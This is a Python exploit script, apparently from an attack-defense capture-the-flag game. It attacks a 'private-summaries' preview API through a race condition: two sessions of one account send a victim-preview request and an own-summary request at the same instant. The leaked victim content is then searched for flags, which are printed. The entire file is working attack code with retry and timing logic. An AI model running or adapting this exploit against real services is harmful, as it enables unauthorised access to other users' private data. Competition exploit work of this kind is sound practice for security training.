#!/usr/bin/env python3
import secrets
import threading
import time
from concurrent.futures import ThreadPoolExecutor

import requests

from common import FLAG_SEARCH, TIMEOUT, account, classify, create_summary, login, report, target


def fetch(session, url, barrier, delay_ms):
    barrier.wait(timeout=4)
    if delay_ms:
        time.sleep(delay_ms / 1000)
    return session.get(url, timeout=TIMEOUT)


def exploit(pool, service, first, second, identifier, preview, deadline):
    own_content = "P" * 4096
    own_id = create_summary(
        first, service, "Race-" + secrets.token_hex(12), own_content, "Live", preview["batchId"]
    )
    prefix = service + "/vodokanal/hs/api/v1/private-summaries/"
    victim_url = prefix + identifier + "/preview?view=public"
    own_url = prefix + own_id + "/preview?view=full"
    baseline = first.get(own_url, timeout=TIMEOUT)
    if baseline.status_code != 200 or baseline.json().get("content") != own_content:
        return False
    for attempt in range(20):
        if time.monotonic() >= deadline:
            return True
        barrier = threading.Barrier(2)
        victim_future = pool.submit(fetch, first, victim_url, barrier, attempt % 7)
        own_future = pool.submit(fetch, second, own_url, barrier, 0)
        try:
            victim, own = victim_future.result(), own_future.result()
        except (requests.RequestException, threading.BrokenBarrierError):
            continue
        if victim.status_code == 429 or own.status_code == 429:
            return True
        if victim.status_code != 200 or own.status_code != 200:
            if victim.status_code >= 500 or own.status_code >= 500:
                continue
            return False
        content = own.json().get("content", "")
        if isinstance(content, str):
            flags = FLAG_SEARCH.findall(content)
            if flags:
                for flag in set(flags):
                    print(flag, flush=True)
                return False
    return False


def main():
    try:
        service, identifiers = target()
        if not identifiers:
            return
        first, username, password = account(service)
        second = login(service, username, password, first.headers.get("User-Agent"))
        if first.cookies.get("ibsession") == second.cookies.get("ibsession"):
            raise RuntimeError("native sessions are identical")
        summaries, _ = classify(first, service, identifiers)
    except (KeyError, ValueError, RuntimeError, requests.RequestException) as error:
        report("setup", error)
        return
    deadline = time.monotonic() + 45
    with ThreadPoolExecutor(max_workers=2) as pool:
        for identifier, preview in summaries:
            try:
                if exploit(pool, service, first, second, identifier, preview, deadline):
                    break
            except (KeyError, ValueError, RuntimeError, requests.RequestException, threading.BrokenBarrierError) as error:
                report(identifier, error)


if __name__ == "__main__":
    main()
